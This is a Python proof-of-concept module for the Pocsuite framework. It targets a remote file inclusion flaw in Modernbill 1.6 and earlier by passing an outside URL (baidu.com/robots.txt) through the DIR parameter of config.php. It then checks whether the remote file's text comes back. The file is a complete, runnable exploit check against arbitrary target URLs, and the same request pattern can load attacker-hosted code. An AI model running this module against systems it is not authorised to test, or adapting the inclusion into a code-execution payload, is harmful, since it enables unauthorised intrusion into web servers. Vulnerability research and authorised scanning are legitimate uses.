#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    vulID = '63791'  # ssvid
    version = '1.0'
    author = ['皮皮']
    vulDate = '2006-08-09'
    createDate = '2015-12-24'
    updateDate = '2015-12-24'
    references = ['http://www.sebug.net/vuldb/ssvid-63791']
    name = 'Modernbill &lt;= 1.6 (config.php) Remote File Include Vulnerability'
    appPowerLink = 'http://freshmeat.net/projects/modernbill/'
    appName = 'Modernbill'
    appVersion = '<= 1.6'
    vulType = 'Remote File Inclusion'
    desc = ''
    samples = ['']


    def _attack(self):
        return self._verify()


    def _verify(self):
        result = {}
        vul_url = '%s/include/html/config.php?DIR=http://baidu.com/robots.txt?' % self.url
        response = req.get(vul_url).content

        if 'Baiduspider' in response and 'Googlebot' in response:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url

        return self.parse_attack(result)


    def parse_attack(self, result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('failed')

        return output

register(TestPOC)